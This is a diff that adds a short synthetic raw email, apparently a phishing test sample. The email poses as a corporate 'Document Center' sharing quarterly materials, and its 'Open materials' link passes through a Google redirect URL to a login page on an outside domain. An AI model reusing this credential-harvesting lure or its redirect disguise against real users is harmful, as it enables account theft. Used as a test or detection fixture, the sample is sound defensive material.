@@ -1,0 +1,9 @@
+From: =?utf-8?B?5paH5qGj5Lit5b+D?= <docs@corp-share.example>
+To: team@corp.internal
+Date: Tue, 25 Aug 2026 10:32:00 +0800
+Message-ID: <0012-b2@synth.example>
+Subject: 季度材料共享
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body><p>季度材料已打包，在线查看：</p><p><a href='https://docs.google.com/url?q=https://share-pack.example.info/login'>打开材料</a></p></body></html>
